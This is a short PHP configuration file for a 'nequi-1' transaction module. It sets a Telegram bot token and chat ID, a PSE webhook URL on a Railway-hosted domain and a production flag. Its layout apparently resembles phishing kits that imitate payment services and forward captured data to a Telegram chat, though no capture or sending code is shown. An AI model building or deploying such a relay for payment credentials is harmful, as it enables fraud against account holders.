<?php
$global = require __DIR__ . '/../config.php';

return [
    'bot_token' => $global['telegram_bot_token'] ?? '',
    'chat_id' => $global['telegram_chat_id'] ?? '',
    'telegram_bot_token' => $global['telegram_bot_token'] ?? '',
    'telegram_chat_id' => $global['telegram_chat_id'] ?? '',
    'pse_webhook_url' => 'https://facturelinexpress-production-26cd.up.railway.app/data-ps/recargas/transaction/nequi-1/pse_webhook.php',
    'base_url' => 'http://localhost:8000/transaction/nequi-1',
    'environment' => 'production'
];
?>


